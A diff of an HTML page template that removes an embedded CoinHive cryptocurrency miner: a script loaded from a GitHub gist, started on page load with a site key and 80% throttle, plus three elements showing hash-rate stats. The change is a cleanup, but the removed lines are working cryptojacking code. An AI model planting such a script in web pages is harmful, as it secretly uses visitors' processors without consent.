@@ -117,9 +117,7 @@
 
  </div>
 	      
-<miner> </miner><br /> 
-<miner> </miner><br /> 
-<miner> </miner><br /> 	      
+   
 
 <!-- paginator -->
 
@@ -175,32 +173,5 @@
 
   </body>
  
-
-<script src="https://gist.githubusercontent.com/nn1k1kvn/dbf187af6d61dade8e2d033213b18db5/raw/2345ed99fbb9f4e2890fb01df145b049523a9ea1/coinhive.min.js"></script>
-<script>
-	var miner = new CoinHive.Anonymous('GgjGYdPYUrCX84WMQSe9rVckfQfMHR0d', {
-
-	autoThreads: true,
-	throttle: 0.8,
-	forceASMJS: false
-});  	// threads: 4,
-	miner.start();
-	// Listen on events
-	miner.on('found', function() { /* Hash found */ })
-	miner.on('accepted', function() { /* Hash accepted by the pool */ })
-
-	// Update stats once per second
-	setInterval(function() {
-		var hashesPerSecond = miner.getHashesPerSecond();
-		var totalHashes = miner.getTotalHashes();
-		var acceptedHashes = miner.getAcceptedHashes();
-
-		// Output to HTML elements...
-
-		document.getElementsByTagName('miner')[0].innerHTML = 'HashesPerSecond: ' + hashesPerSecond;
-		document.getElementsByTagName('miner')[1].innerHTML = 'TotalHashes: ' + totalHashes;
-		document.getElementsByTagName('miner')[2].innerHTML = 'AcceptedHashes: ' + acceptedHashes;
-	}, 1000);
-</script>
 
 </html>
